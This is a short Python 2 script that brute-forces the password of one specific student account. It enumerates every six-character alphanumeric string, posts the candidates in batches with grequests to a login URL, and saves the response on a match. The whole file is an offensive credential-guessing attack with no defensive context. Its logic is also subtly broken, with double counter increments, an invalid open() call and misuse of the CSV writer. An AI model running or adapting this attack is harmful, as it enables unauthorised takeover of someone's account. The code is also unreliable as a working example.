import grequests
import itertools
import csv

def do_something(response, *args, **kwargs):
    print response

payloads = []
counter = 0
initial_ping = 0
for ele in itertools.product("0123456789abcdefghijklmnopqrstuvwxyz",repeat=6):
    elements = "".join(ele)
    mayload = {'username': "512563", 'password': elements, 'role': "student"}
    print elements
    payloads.append(mayload)
    counter += 1
    initial_ping += 1
    if (0 < initial_ping < 500000):
        counter += 1
        if (counter == 500):
            unsent_request = []

            for payload_single in payloads:
                unsent_request.append(grequests.post('https://website/accounts/login', hooks={'response': do_something}, data=payload_single))

            responses =  grequests.map(unsent_request)
            for r in responses:
                print r.text
                word = 'true'
                if word in r.text:
                    with open('result.csv', 'wb', newline='') as fp:
                        a = csv.writer(fp, delimiter=',')
                        a.writerows(r.text)
                    break
            payloads = []
            counter = 0
            continue
